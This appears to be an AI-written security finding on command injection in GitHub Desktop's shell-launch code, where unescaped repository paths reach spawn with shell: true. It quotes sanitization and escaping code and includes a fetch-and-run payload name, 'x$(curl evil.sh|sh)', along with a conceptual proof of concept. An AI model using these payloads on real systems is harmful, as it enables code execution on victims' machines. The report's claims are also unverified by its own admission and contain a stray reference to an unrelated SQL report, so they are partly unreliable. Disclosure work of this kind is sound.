### Title
Command Injection via Unescaped Repository Path in Shell Launch Commands - ([File: app/src/lib/shells/win32.ts])

### Summary
When a user clicks "Open in shell" for a repository, GitHub Desktop builds a shell command line by directly string-interpolating the repository's local filesystem path into a `spawn(..., { shell: true })` call for several supported terminal emulators. The repository's directory name is derived from a git remote URL's repo-name component, which is only sanitized for **path traversal** (via `sanitizeCloneName`) — not for shell metacharacters. On macOS/Linux the directory name is not sanitized at all (`safeDirectoryName` is a no-op there), and even the Windows-only character-stripping (`<>:"|?*`) leaves characters such as `$`, backtick, `'`, `;`, and `&` untouched. This mirrors the injected-parameter class from the report: an attacker-controlled string (there, `acctid` in a SQL query; here, a repo name embedded in a shell command) reaches an interpreter without escaping, breaking the command's structural invariant.

### Finding Description
`launch()` in [1](#0-0)  builds several shell-specific command strings by directly interpolating the caller-supplied `path` argument, e.g. for Cygwin:
```
return spawn(
  cygwinPath,
  [`/bin/sh -lc 'cd "$(cygpath "${path}")"; exec bash'`],
  { shell: true, cwd: path }
)
```
and similarly for Hyper, Alacritty, Warp, GitBash, all invoked with `shell: true`, meaning the resulting string is re-parsed by a shell/`cmd.exe` before execution [2](#0-1) .

`path` here is the repository's local clone path, whose leaf directory name is derived from `sanitizeCloneName()` [3](#0-2) , which only strips path-separator components and rejects `..`/`.` — it performs no filtering of shell metacharacters such as `"`, `` ` ``, `$`, `'`, `;`, `&`, or `|`. The only other sanitization point, `safeDirectoryName()` in the repository-creation UI, is explicitly a Windows-only character replacement and is a pass-through on macOS/Linux [4](#0-3) . Neither guard is designed to protect shell command construction, only filesystem/path-traversal safety, and the existing `clone-path-safety-test.ts` only validates traversal containment, not metacharacter handling [5](#0-4) .

Because a git remote URL can point to an arbitrary (non-GitHub) server, an attacker fully controls the `name` component parsed out of the URL by `parseRepositoryIdentifier`/`parseRemote` [6](#0-5) , which flows into `sanitizeCloneName` and ultimately becomes the on-disk directory name used as `path` in `launch()`.

### Impact Explanation
If a victim clones or is directed to a repository whose remote-derived name contains shell metacharacters (e.g. a name resolving to a folder like `x$(curl evil.sh|sh)`), then later uses Desktop's "Open in Shell" feature for that repository with one of the affected shells (Cygwin, Git Bash, Hyper, Alacritty, Warp, PowerShell Core paths on Windows), the unescaped path is re-parsed by a shell, allowing arbitrary command execution on the victim's machine. This satisfies the "attacker controls a cloned/fetched repository ... result is code execution" impact category.

### Likelihood Explanation
Requires: (1) the victim clones from an attacker-controlled/arbitrary git server (not restricted to github.com naming rules), (2) the resulting local folder name contains shell-breaking characters that survive `sanitizeCloneName`, and (3) the user performs the ordinary, expected action of opening a shell for that repository on Windows with one of the vulnerable shell integrations. This is a natural, single-click user action (no unusual steps), so it meets the "natural user step" bar, though it does require a specific platform/shell configuration and a crafted remote name, making exploitation moderately likely rather than trivial.

### Recommendation
Escape or reject shell metacharacters in the constructed command strings before invoking `spawn(..., { shell: true })` in `win32.ts`, consistently with the escaping helpers already implemented in `app/src/lib/hooks/shell-escape.ts` [7](#0-6) . Apply the same quoting/escaping used there (or equivalent) to every shell case in `launch()`, and/or sanitize directory names derived from remote URLs to strip shell-significant characters, not just path separators.

### Proof of Concept
Conceptual PoC (not executed):
1. Host a git repository at a URL whose basename resolves (after `sanitizeCloneName`) to a string containing shell metacharacters, e.g. clone target directory name: `repo$(calc.exe)` (Windows) or similar payload for the target shell.
2. Have the victim clone this repository into that directory (via "Clone repository" with a custom/generic URL, bypassing GitHub's stricter repo-name validation).
3. Victim selects "Open in Git Bash" (or Cygwin/Hyper/Alacritty/Warp) for that repository from Desktop's repository menu.
4. `launch()` in `win32.ts` builds the shell command string with the unescaped path and calls `spawn(..., { shell: true })`, causing the embedded command substitution/metacharacters to execute.

Note: I was not able to fully trace every code path that determines exactly which characters are filesystem-legal versus rejected on each OS, nor confirm end-to-end via execution (no sandbox/terminal access in this environment), so exploitability should be validated experimentally on Windows with the specific shell integrations named above.

export function sanitizeCloneName(name: string): string | null {
  const components = name.split(/[/\\:]/)

  let lastComponent = ''
  for (let i = components.length - 1; i >= 0; i--) {
    if (components[i].length > 0) {
      lastComponent = components[i]
      break
    }
  }

  if (lastComponent.length === 0) {
    return null
  }

  if (lastComponent.endsWith('.git')) {
    lastComponent = lastComponent.slice(0, -4)
  }

  if (
    lastComponent === '..' ||
    lastComponent === '.' ||
    lastComponent.length === 0
  ) {
    return null
  }

  return lastComponent
}

type Shell = {
  args: string[]
  quoteCommand: (cmd: string, ...args: string[]) => string

// https://github.com/ericcornelissen/shescape/blob/89072ba7de233f81f5553b52098671c94eb9bd0c/src/internal/unix/bash.js#L39
const bashEscape = (arg: string) =>
  arg
    .replace(/[\0\u0008\u001B\u009B]/gu, '')
    .replace(/\r(?!\n)/gu, '')
    .replace(/'/gu, "'\\''")

const shQuoteCommand = (
  escapeFn: (arg: string) => string,
  cmd: string,
  ...args: string[]
) => [cmd, ...args].map(a => `'${escapeFn(a)}'`).join(' ')

export const bash: Shell = {
  args: ['-ilc'],
  quoteCommand: shQuoteCommand.bind(null, bashEscape),
}

// https://github.com/ericcornelissen/shescape/blob/89072ba7de233f81f5553b52098671c94eb9bd0c/src/internal/unix/zsh.js#L37
// At time of writing zsh escapeArgForQuoted was identical to bash's
const zshEscape = bashEscape

export const zsh: Shell = {
  args: ['-ilc'],

// https://github.com/ericcornelissen/shescape/blob/89072ba7de233f81f5553b52098671c94eb9bd0c/src/internal/win/cmd.js#L35
const cmdEscape = (arg: string) =>
  arg
    .replace(/[\0\u0008\r\u001B\u009B]/gu, '')
    .replace(/\n/gu, ' ')
    .replace(/"/gu, '""')
    .replace(/([%&<>^|])/gu, '"^$1"')
    .replace(/(?<!\\)(\\*)(?="|$)/gu, '$1$1')

export const cmd: Shell = {
  args: ['/d', '/s', '/c'],
  quoteCommand: (cmd, ...args) =>
    `"${[cmd, ...args].map(a => `"${cmdEscape(a)}"`).join(' ')}"`,
}
